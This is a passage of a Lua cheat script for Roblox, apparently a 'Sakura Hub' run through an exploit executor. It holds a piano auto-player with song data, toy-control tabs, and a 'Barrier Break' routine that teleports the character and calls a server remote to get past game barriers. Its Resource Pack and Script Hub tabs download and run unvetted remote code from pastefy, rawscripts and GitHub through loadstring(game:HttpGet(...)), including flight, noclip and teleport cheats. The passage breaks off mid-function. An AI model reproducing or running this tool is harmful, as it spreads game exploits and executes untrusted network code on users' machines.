  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.75},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.75},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.5},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.375},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key2G", "delay": 0.375},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.75},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key2D", "delay": 0.375},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key3C", "delay": 1},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.75},
  {"key": "Key2F", "delay": 0.5},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2G", "delay": 1.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.75},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2G", "delay": 1.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.75},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25}
]
]]

    -- ========================================================================
    -- Default Songs Section
    -- ========================================================================
    local DefaultSongSec = PianoTab:AddSection({ Name = "🎵 Default Songs" })

    DefaultSongSec:AddLabel("Select a song to play")

    DefaultSongSec:AddButton({
        Name = "▶ Play Girl A (少女A)",
        Callback = function()
            if not SH.PianoConfig.Keyboard then
                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
            end
            if not SH.PianoConfig.Keyboard then
                PlayErrorSound()
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "MusicKeyboard not found",
                    Time = 5
                })
                return
            end
            PlayActionSound()
            SH.PianoConfig.SongData = DEFAULT_SONG_SHOJO_A
            _G.playSongFromJSONString(DEFAULT_SONG_SHOJO_A)
            OrionLib:MakeNotification({
                Name = "Auto Play",
                Content = "Started playing Girl A",
                Time = 3
            })
        end
    })

    DefaultSongSec:AddButton({
        Name = "▶ unhappy （BX制作的）",
        Callback = function()
            if not SH.PianoConfig.Keyboard then
                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
            end
            if not SH.PianoConfig.Keyboard then
                PlayErrorSound()
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "MusicKeyboard not found",
                    Time = 5
                })
                return
            end
            PlayActionSound()
            SH.PianoConfig.SongData = DEFAULT_SONG_GONGKYEOKJEON
            _G.playSongFromJSONString(DEFAULT_SONG_GONGKYEOKJEON)
            OrionLib:MakeNotification({
                Name = "Auto Play",
                Content = "Started playing 공격전이다",
                Time = 3
            })
        end
    })

    DefaultSongSec:AddButton({
        Name = "▶ Play MONTAGEM_HIKARI",
        Callback = function()
            if not SH.PianoConfig.Keyboard then
                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
            end
            if not SH.PianoConfig.Keyboard then
                PlayErrorSound()
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "MusicKeyboard not found",
                    Time = 5
                })
                return
            end
            PlayActionSound()
            SH.PianoConfig.SongData = DEFAULT_SONG_MONTAGEM_HIKARI
            _G.playSongFromJSONString(DEFAULT_SONG_MONTAGEM_HIKARI)
            OrionLib:MakeNotification({
                Name = "Auto Play",
                Content = "Started playing MONTAGEM_HIKARI",
                Time = 3
            })
        end
    })

    DefaultSongSec:AddButton({
        Name = "⏹ Stop Playing",
        Callback = function()
            _G.stopSong()
            OrionLib:MakeNotification({
                Name = "Stopped",
                Content = "Playback stopped",
                Time = 3
            })
        end
    })

    -- ========================================================================
    -- Play Song (Text Input)
    -- ========================================================================
    local PianoSongSec = PianoTab:AddSection({ Name = "Play Song (Text Input)" })
    PianoSongSec:AddTextbox({ Name = "Enter JSON Data", Default = "", TextDisappear = false, Callback = function(text)
        if text and text ~= "" then SH.PianoConfig.SongData = text; OrionLib:MakeNotification({ Name = "Load Complete", Content = "JSON text set", Time = 3 }) end
    end })
    PianoSongSec:AddButton({ Name = "Play Entered Song", Callback = function()
        if not SH.PianoConfig.Keyboard then SH.PianoConfig.Keyboard = _G.getMusicKeyboard() end
        if not SH.PianoConfig.Keyboard then 
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "MusicKeyboard not found", Time = 5})
            return 
        end
        if not SH.PianoConfig.SongData or SH.PianoConfig.SongData == "" then 
            PlayErrorSound()
            OrionLib:MakeNotification({Name = "Error", Content = "Please enter JSON data", Time = 5})
            return 
        end
        PlayActionSound()
        _G.playSongFromJSONString(SH.PianoConfig.SongData)
        OrionLib:MakeNotification({ Name = "Auto Play", Content = "Playback started", Time = 3 })
    end })
    PianoSongSec:AddButton({ Name = "Stop Playing", Callback = function()
        _G.stopSong()
        OrionLib:MakeNotification({ Name = "Stopped", Content = "Song playback stopped", Time = 3 })
    end })

    -- ========================================================================
    -- MIDI → JSON Converter
    -- ========================================================================
    local ConverterSec = PianoTab:AddSection({ Name = "MIDI → JSON Converter" })
    ConverterSec:AddButton({ Name = "🌐 Open Converter (Browser)", Callback = function()
        PlayActionSound()
        local url = "https://saturngroup02.github.io/piano-MIDI-or-key/"
        local success, err = pcall(function()
            if syn and syn.open_url then syn.open_url(url)
            else setclipboard(url); OrionLib:MakeNotification({ Name = "URL Copied", Content = "Open in browser: " .. url, Time = 8 }) end
        end)
        if not success then setclipboard(url); OrionLib:MakeNotification({ Name = "URL Copied", Content = "Open in browser: " .. url, Time = 8 }) end
    end })
    ConverterSec:AddButton({ Name = "📋 Copy URL", Callback = function()
        PlayActionSound()
        setclipboard("https://saturngroup02.github.io/piano-MIDI-or-key/")
        OrionLib:MakeNotification({ Name = "URL Copied", Content = "Copied to clipboard", Time = 4 })
    end })
    ConverterSec:AddParagraph("How to Use", "1. Open the MIDI → JSON conversion page with 'Open Converter'\n2. Upload a MIDI file and convert\n3. Copy the generated JSON\n4. Paste into 'Enter JSON Data' above and play")
    ConverterSec:AddLabel("Supported range: C4 to C6 (2 octaves)")
end

-- ============================================================================
-- Block 34: SRBM Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local UserInputService = _G.UserInputService
    local RunService = _G.RunService

    local SRBMTab = Window:MakeTab({ Name = "SRBM", Icon = "rbxassetid://4483345998", PremiumOnly = false })
    SRBMTab:AddParagraph("Note", "SRBM features can only obtain your own objects!")

    SRBMTab:AddSection({ Name = "HUD Display" })
    local hudActive = false
    local hudScreenGui = nil
    local hudImageLabel = nil
    local hudCoordLabel = nil
    local hudCoordGui = nil
    local hudVisible = true

    local function CreateHUD()
        if hudScreenGui then hudScreenGui:Destroy(); hudScreenGui = nil end
        if hudCoordGui then hudCoordGui:Destroy(); hudCoordGui = nil end
        hudScreenGui = Instance.new("ScreenGui")
        hudScreenGui.Name = "SRBM_HUD"
        hudScreenGui.Parent = LocalPlayer.PlayerGui
        hudImageLabel = Instance.new("ImageLabel")
        hudImageLabel.Size = UDim2.new(0, 200, 0, 200)
        hudImageLabel.Position = UDim2.new(0.5, -100, 0.5, -100)
        hudImageLabel.BackgroundTransparency = 1
        hudImageLabel.Image = "rbxassetid://133111892922392"
        hudImageLabel.Parent = hudScreenGui
        hudCoordGui = Instance.new("ScreenGui")
        hudCoordGui.Name = "SRBM_Coord"
        hudCoordGui.Parent = LocalPlayer.PlayerGui
        hudCoordLabel = Instance.new("TextLabel")
        hudCoordLabel.Size = UDim2.new(0, 250, 0, 30)
        hudCoordLabel.Position = UDim2.new(0, 10, 0, 10)
        hudCoordLabel.BackgroundTransparency = 1
        hudCoordLabel.Text = "Coords: 0, 0, 0"
        hudCoordLabel.TextColor3 = Color3.new(0, 1, 0)
        hudCoordLabel.TextScaled = true
        hudCoordLabel.Font = Enum.Font.GothamBold
        hudCoordLabel.TextXAlignment = Enum.TextXAlignment.Left
        hudCoordLabel.Parent = hudCoordGui
        hudVisible = true
    end

    local function ToggleHUDVisibility()
        hudVisible = not hudVisible
        if hudScreenGui then hudScreenGui.Enabled = hudVisible end
        if hudCoordGui then hudCoordGui.Enabled = hudVisible end
    end

    local coordUpdateConnection = nil

    local function StartHUD()
        if hudActive then return end
        hudActive = true
        CreateHUD()
        if coordUpdateConnection then coordUpdateConnection:Disconnect() end
        coordUpdateConnection = RunService.Heartbeat:Connect(function()
            if not hudActive then return end
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local pos = char.HumanoidRootPart.Position
                if hudCoordLabel then hudCoordLabel.Text = string.format("Coords: %.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z) end
            else
                if hudCoordLabel then hudCoordLabel.Text = "Coords: Acquiring..." end
            end
        end)
        UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.P then
                ToggleHUDVisibility()
                OrionLib:MakeNotification({ Name = "HUD", Content = hudVisible and "Visible" or "Hidden", Time = 1 })
            end
        end)
        OrionLib:MakeNotification({ Name = "HUD Display", Content = "Enabled (P key to toggle visibility)", Time = 3 })
    end

    local function StopHUD()
        hudActive = false
        if coordUpdateConnection then coordUpdateConnection:Disconnect(); coordUpdateConnection = nil end
        if hudScreenGui then hudScreenGui:Destroy(); hudScreenGui = nil end
        if hudCoordGui then hudCoordGui:Destroy(); hudCoordGui = nil end
        hudImageLabel = nil
        hudCoordLabel = nil
        OrionLib:MakeNotification({ Name = "HUD Display", Content = "Disabled", Time = 2 })
    end

    SRBMTab:AddToggle({
        Name = "HUD Display (Image + Coords)",
        Default = false,
        Callback = function(Value)
            if Value then PlayActionSound(); StartHUD() else StopHUD() end
        end
    })

    SRBMTab:AddButton({
        Name = "Toggle Visibility with P Key (Info)",
        Callback = function()
            PlayActionSound()
            OrionLib:MakeNotification({ Name = "Controls", Content = "P key toggles visibility of image and coords", Time = 4 })
        end
    })

    local originalCollides = {}
    local activeToys = {}
    local selectedTarget = "meobject"
    local bombMissileStartTime = nil
    local originalCameraSubject = nil
    local originalCameraType = nil
    local keysDown = {}
    local effectCoroutine = nil

    UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        keysDown[input.KeyCode] = true
    end)

    UserInputService.InputEnded:Connect(function(input, gpe)
        keysDown[input.KeyCode] = false
    end)

    local toys = { missileRotationOffset = -135, mod = nil, isMoving = false }

    local function createBodyMovers(part)
        local bp = part:FindFirstChild("BP") or Instance.new("BodyPosition")
        bp.Name = "BP"; bp.P = 20000; bp.D = 200
        bp.MaxForce = Vector3.new(5e6, 5e6, 5e6)
        bp.Position = part.Position; bp.Parent = part
        local bg = part:FindFirstChild("BG") or Instance.new("BodyGyro")
        bg.Name = "BG"; bg.P = 20000; bg.D = 200
        bg.MaxTorque = Vector3.new(5e6, 5e6, 5e6)
        bg.CFrame = part.CFrame; bg.Parent = part
        part.Anchored = false
    end

    local function enableCollision(model)
        for _, p in pairs(model:GetDescendants()) do
            if p:IsA("BasePart") then
                if originalCollides[p] == nil then originalCollides[p] = p.CanCollide end
                p.CanCollide = originalCollides[p]
            end
        end
    end

    local function collectModelsInFolder(folder)
        for _, toy in ipairs(folder:GetDescendants()) do
            if toy:IsA("Model") then
                local part = toy:FindFirstChildWhichIsA("BasePart")
                if part and not activeToys[toy] then
                    activeToys[toy] = { part = part, index = math.random(1, 1000) }
                    enableCollision(toy)
                    createBodyMovers(part)
                end
            end
        end
    end

    local function addToysToAura(target)
        if target == "meobject" then
            local meFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
            if meFolder then collectModelsInFolder(meFolder) end
            local plotsFolder = workspace:FindFirstChild("Plots")
            if plotsFolder then
                for i = 1, 5 do
                    local plot = plotsFolder:FindFirstChild("Plot" .. i)
                    if plot then
                        local ownersFolder = plot:FindFirstChild("PlotSign") and plot.PlotSign:FindFirstChild("ThisPlotsOwners")
                        if ownersFolder then
                            for _, v in ipairs(ownersFolder:GetChildren()) do
                                if v:IsA("ValueBase") and v.Value == LocalPlayer.Name then
                                    local plotItemsFolder = workspace:FindFirstChild("PlotItems")
                                    if plotItemsFolder and plotItemsFolder:FindFirstChild(plot.Name) then
                                        collectModelsInFolder(plotItemsFolder:FindFirstChild(plot.Name))
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    function clearEffects()
        for toy, _ in pairs(activeToys) do
            for _, child in ipairs(toy:GetDescendants()) do
                if child:IsA("BodyMover") or child:IsA("BodyGyro") then child:Destroy() end
            end
            enableCollision(toy)
        end
        activeToys = {}
    end

    local function bombMissileEffect()
        local camera = workspace.CurrentCamera
        local missile = nil
        for toy, data in pairs(activeToys) do
            if toy.Name == "BombMissile" then missile = toy; break end
        end
        if not missile then
            if originalCameraSubject then
                camera.CameraSubject = originalCameraSubject
                camera.CameraType = originalCameraType
                originalCameraSubject = nil
                bombMissileStartTime = nil
            end
            return
        end
        local part = missile:FindFirstChildWhichIsA("BasePart")
        if not part or not part:FindFirstChild("BP") or not part:FindFirstChild("BG") then return end
        if not bombMissileStartTime then
            bombMissileStartTime = os.clock()
            originalCameraSubject = camera.CameraSubject
            originalCameraType = camera.CameraType
            camera.CameraSubject = part
        end
        local elapsed = os.clock() - bombMissileStartTime
        local speed = 2
        if elapsed < 5 then
            part.BP.Position = part.Position + Vector3.new(0, speed, 0)
        else
            part.BP.Position = part.Position + camera.CFrame.LookVector * speed
            part.BG.CFrame = camera.CFrame * CFrame.Angles(math.rad(toys.missileRotationOffset), 0, 0)
        end
    end

    local function helicopterEffect()
        local camera = workspace.CurrentCamera
        local heli = nil
        for toy, data in pairs(activeToys) do
            if toy.Name == "FlyingToyHelicopter" then heli = toy; break end
        end
        if not heli then
            if originalCameraSubject then
                camera.CameraSubject = originalCameraSubject
                camera.CameraType = originalCameraType
                originalCameraSubject = nil
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                end
            end
            return
        end
        local part = heli:FindFirstChildWhichIsA("BasePart")
        if not part or not part:FindFirstChild("BP") or not part:FindFirstChild("BG") then return end
        if not originalCameraSubject then
            originalCameraSubject = camera.CameraSubject
            originalCameraType = camera.CameraType
            local cameraTarget = heli:FindFirstChild("Body") or part
            camera.CameraSubject = cameraTarget
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.Anchored = true
            end
        end
        local moveSpeed = 0.3
        local rotateSpeed = 1.5
        local verticalSpeed = 0.3
        local moveDir = Vector3.new(0, 0, 0)
        local rotationChange = 0
        if keysDown[Enum.KeyCode.W] then moveDir = moveDir - part.CFrame.LookVector * moveSpeed end
        if keysDown[Enum.KeyCode.S] then moveDir = moveDir + part.CFrame.LookVector * moveSpeed end
        if keysDown[Enum.KeyCode.A] then rotationChange = rotationChange + rotateSpeed end
        if keysDown[Enum.KeyCode.D] then rotationChange = rotationChange - rotateSpeed end
        if keysDown[Enum.KeyCode.Z] then moveDir = moveDir + Vector3.new(0, verticalSpeed, 0) end
        if keysDown[Enum.KeyCode.X] then moveDir = moveDir - Vector3.new(0, verticalSpeed, 0) end
        if moveDir.Magnitude > 0 then part.BP.Position = part.Position + moveDir end
        if rotationChange ~= 0 then
            local x, y, z = part.BG.CFrame:ToEulerAnglesYXZ()
            part.BG.CFrame = CFrame.fromEulerAnglesYXZ(x, y + math.rad(rotationChange), z)
        end
    end

    local function combinedEffect()
        if toys.mod == "BombMissile" then bombMissileEffect()
        elseif toys.mod == "Helicopter" then helicopterEffect() end
    end

    function toggleEffect()
        if toys.isMoving then
            addToysToAura(selectedTarget)
            if effectCoroutine then coroutine.close(effectCoroutine) end
            effectCoroutine = coroutine.create(function()
                while toys.isMoving do
                    combinedEffect()
                    task.wait()
                end
            end)
            coroutine.resume(effectCoroutine)
        else
            if effectCoroutine then
                coroutine.close(effectCoroutine)
                effectCoroutine = nil
            end
            clearEffects()
            if originalCameraSubject then
                local camera = workspace.CurrentCamera
                camera.CameraSubject = originalCameraSubject
                camera.CameraType = originalCameraType
                originalCameraSubject = nil
                bombMissileStartTime = nil
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
                end
            end
        end
    end

    SRBMTab:AddToggle({
        Name = "ICBM",
        Default = false,
        Save = true,
        Callback = function(state)
            toys.isMoving = state
            toys.mod = state and "BombMissile" or nil
            if state then PlayActionSound() end
            toggleEffect()
        end
    })

    SRBMTab:AddToggle({
        Name = "Third Person",
        Default = false,
        Callback = function(state)
            if state then
                PlayActionSound()
                LocalPlayer.CameraMode = Enum.CameraMode.Classic
                LocalPlayer.CameraMaxZoomDistance = 100
                LocalPlayer.CameraMinZoomDistance = 0.5
            else
                LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
                LocalPlayer.CameraMaxZoomDistance = 0.5
                LocalPlayer.CameraMinZoomDistance = 0.5
            end
        end    
    })

    SRBMTab:AddToggle({
        Name = "Helicopter Control",
        Default = false,
        Save = true,
        Callback = function(state)
            toys.isMoving = state
            toys.mod = state and "Helicopter" or nil
            if state then PlayActionSound() end
            toggleEffect()
        end
    })

    SRBMTab:AddDropdown({
        Name = "Toy Mode",
        Default = selectedTarget,
        Options = {"meobject"},
        Callback = function(sel)
            selectedTarget = sel
            PlayActionSound()
            addToysToAura(selectedTarget)
        end
    })
end

-- ============================================================================
-- Block 35: Resource Pack Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib

    local ResourcePackTab = Window:MakeTab({ Name = "Resource Pack", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    ResourcePackTab:AddSection({ Name = "Load Resource Pack" })

    ResourcePackTab:AddButton({
        Name = "Resource Pack V1",
        Callback = function()
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://pastefy.app/XNJSi96W/raw"))()
            end)
            if success then
                PlayActionSound()
                OrionLib:MakeNotification({ Name = "Resource Pack V1", Content = "Loaded successfully! Replaced TractorGreen appearance", Time = 4 })
            else
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Resource Pack V1", Content = "Load failed: " .. tostring(err), Time = 5 })
            end
        end
    })

    ResourcePackTab:AddParagraph("Description", 
        "Replaces the appearance of TractorGreen with another model.\n" ..
        "Original functionality is maintained; the new appearance follows."
    )
end

-- ============================================================================
-- Block 36: Script Hub Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib

    local ScriptHubTab = Window:MakeTab({ Name = "Script Hub", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    ScriptHubTab:AddParagraph("⚠️ Note", "Some external scripts are developed outside Sakura Hub. No guarantee.")
    ScriptHubTab:AddSection({ Name = "Load External Scripts" })

    local function executeScript(url, name)
        local success, err = pcall(function()
            loadstring(game:HttpGet(url))()
        end)
        if success then
            PlayActionSound()
            OrionLib:MakeNotification({ Name = name, Content = "Loaded successfully!", Time = 3 })
        else
            PlayErrorSound()
            OrionLib:MakeNotification({ Name = name, Content = "Load failed: " .. tostring(err), Time = 5 })
        end
    end

    ScriptHubTab:AddButton({ Name = "Shader", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-Shader-77482", "Shader") end })
    ScriptHubTab:AddButton({ Name = "Shader 2", Callback = function() executeScript("https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua", "Shader 2") end })
    ScriptHubTab:AddButton({ Name = "Sky Change", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-SkyBoxinjectHUB-80671", "Sky Change") end })
    ScriptHubTab:AddButton({ Name = "Tetris", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-RTetris-76191", "Tetris") end })
    ScriptHubTab:AddButton({ Name = "Kurosuke's V-Style Flight", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-VFly-gui-and-noclip-78112", "Kurosuke's V-Style Flight") end })
    ScriptHubTab:AddButton({ Name = "HokutoHUB", Callback = function() executeScript("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/06bb272eb235d0cee619c2d78355f62cdbe512da/HokutoHUB", "HokutoHUB") end })
    ScriptHubTab:AddButton({ Name = "Backrooms", Callback = function() executeScript("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/Backrooms", "Backrooms") end })
    ScriptHubTab:AddButton({ Name = "Translate UI to Japanese", Callback = function() executeScript("https://pastefy.app/HCUekFMV/raw", "Translate UI to Japanese") end })
    ScriptHubTab:AddButton({ Name = "FTAP TP", Callback = function() executeScript("https://pastefy.app/pAbXnxgr/raw", "FTAP TP") end })
end

-- ============================================================================
-- Block 37: Object Settings Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local changeObjectID = _G.changeObjectID

    local ObjectIDTab = Window:MakeTab({ Name = "Object Settings", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    ObjectIDTab:AddLabel("All Object IDs (28 types):")
    local rows = {{1,7}, {8,14}, {15,21}, {22,28}}
    for _, row in ipairs(rows) do
        ObjectIDTab:AddLabel("【Lines " .. row[1] .. "-" .. row[2] .. "】")
        for i = row[1], row[2] do
            local id = SH.ObjectIDConfig.AvailableObjects[i]
            ObjectIDTab:AddButton({ Name = id, Callback = function() changeObjectID(id) end })
        end
    end
    ObjectIDTab:AddLabel("Supported objects: 28 types")
end

-- ============================================================================
-- Block 38: Barrier Break Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local ReplicatedStorage = _G.ReplicatedStorage

    local BarrierBreakTab = Window:MakeTab({ Name = "Barrier Break", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    BarrierBreakTab:AddSection({ Name = "Barrier Break Feature" })
    BarrierBreakTab:AddButton({
        Name = "Barrier Break (BETA)",
        Callback = function()
            local player = LocalPlayer
            if not player then 
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Player not found", Time = 4 })
                return 
            end
            if not (player.Character and player.Character:FindFirstChild("HumanoidRootPart")) then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Character not ready", Time = 4 })
                return
            end
            PlayActionSound()
            local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            local originalWalkSpeed, originalJumpPower
            if humanoid then
                originalWalkSpeed = humanoid.WalkSpeed
                originalJumpPower = humanoid.JumpPower
                pcall(function()
                    humanoid.WalkSpeed = 0
                    humanoid.JumpPower = 0
                end)
            end
            local success, err = pcall(function()
                local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
                local hrp = player.Character.HumanoidRootPart
                local originalCFrame = hrp.CFrame
                hrp.CFrame = CFrame.new(246.052, -7.35, 431.821)
                task.wait(0.05)
                MenuToys.SpawnToyRemoteFunction:InvokeServer(
                    "InstrumentWoodwindOcarina",
                    CFrame.new(184.148834, -5.54824972, 498.136749,
                        0.829037189, -0.214714944, 0.516328275,
                        0, 0.923344612, 0.383972496,
                        -0.559193552, -0.318327487, 0.765486956),
                    Vector3.new(0, 34, 0)
                )
                task.wait(0.2)
                local toyFolder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if not toyFolder then error("SpawnedInToys folder not found") end
